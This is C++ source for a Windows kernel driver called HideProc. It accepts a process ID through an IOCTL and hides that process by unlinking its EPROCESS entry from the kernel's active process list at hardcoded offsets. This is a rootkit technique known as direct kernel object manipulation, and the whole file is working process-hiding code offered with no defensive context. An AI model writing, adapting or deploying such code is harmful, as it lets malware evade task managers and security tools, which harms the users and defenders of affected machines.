#include <ntifs.h>
#include "CreateDriver.h"

#define FLINKOFFSET 0x448
constexpr ULONG hideCode = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x914, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);

UNICODE_STRING dev_name, sym_link;
DRIVER_UNLOAD DriverUnload;

struct data_transfer {
	ULONG PID;
};

NTSTATUS HideProc(DWORD64 eproc) {
	PLIST_ENTRY plist_active_process;
	if (eproc == 0x00000000)
		return STATUS_INVALID_PARAMETER;

	plist_active_process = (PLIST_ENTRY)((ULONG_PTR)eproc + FLINKOFFSET);

	plist_active_process->Blink->Flink = plist_active_process->Flink;
	plist_active_process->Flink->Blink = plist_active_process->Blink;

	plist_active_process->Flink = (LIST_ENTRY*)&(plist_active_process->Flink);
	plist_active_process->Blink = (LIST_ENTRY*)&(plist_active_process->Flink);
}
DWORD64 FindProcessEPROC(int terminate_PID){

	DWORD64 eproc = 0x00000000;

	int current_PID = 0;
	int start_PID = 0;
	int i_count = 0;

	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	// Get the address of the current EPROCESS
	eproc = (DWORD64)PsGetCurrentProcess();

	start_PID = *((int*)(eproc + 0x440)); //   + PID_OFFSET

	current_PID = start_PID;

	while (1)
	{
		if (terminate_PID == current_PID) // found
			return eproc;
		else if ((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else { // Advance in the list.
			plist_active_procs = (LIST_ENTRY*)(eproc + FLINKOFFSET);
			eproc = (DWORD64)plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			current_PID = *((int*)(eproc + 0x440)); //   + PID_OFFSET
			i_count++;
		}

	}

}

NTSTATUS IOCTL_ENTRY(PDEVICE_OBJECT device_obj, PIRP irp) {
	UNREFERENCED_PARAMETER(device_obj);

	irp->IoStatus.Information = sizeof(data_transfer);
	auto stack = IoGetCurrentIrpStackLocation(irp);
	if (stack) {
		const auto ctl_code = stack->Parameters.DeviceIoControl.IoControlCode;
		if (ctl_code == hideCode) {
			auto buffer = (data_transfer*)irp->AssociatedIrp.SystemBuffer;
			ULONG processID = buffer->PID; // 
			DWORD64 Eproc = FindProcessEPROC(processID); //
			HideProc(Eproc); // 
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Process has been Hidden.\n"); //
		}
	}
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS unsupported_io(PDEVICE_OBJECT device_obj, PIRP irp) {
	UNREFERENCED_PARAMETER(device_obj);

	irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return irp->IoStatus.Status;
}

NTSTATUS create_io(PDEVICE_OBJECT device_obj, PIRP irp) {
	UNREFERENCED_PARAMETER(device_obj);

	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return irp->IoStatus.Status;
}

NTSTATUS close_io(PDEVICE_OBJECT device_obj, PIRP irp) {
	UNREFERENCED_PARAMETER(device_obj);

	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return irp->IoStatus.Status;
}

_Use_decl_annotations_ VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "In Driver Unload; HideProc.sys\n");
	IoDeleteSymbolicLink(&sym_link);
	IoDeleteDevice(DriverObject->DeviceObject);

	return;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	PDEVICE_OBJECT dev_obj;

	RtlInitUnicodeString(&dev_name, L"\\Device\\HideProcess");
	auto status = IoCreateDevice(DriverObject, 0, &dev_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &dev_obj);
	if (status != STATUS_SUCCESS) return status;

	RtlInitUnicodeString(&sym_link, L"\\DosDevices\\HideProcess");
	status = IoCreateSymbolicLink(&sym_link, &dev_name);
	if (status != STATUS_SUCCESS) return status;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Hide Proc Driver Loaded Successfully !\n");

	DriverObject->MajorFunction[IRP_MJ_CREATE] = create_io;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = close_io;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_ENTRY;

	DriverObject->DriverUnload = DriverUnload;
	//ClearFlag(dev_obj->Flags, DO_DEVICE_INITIALIZING);

	return status;
}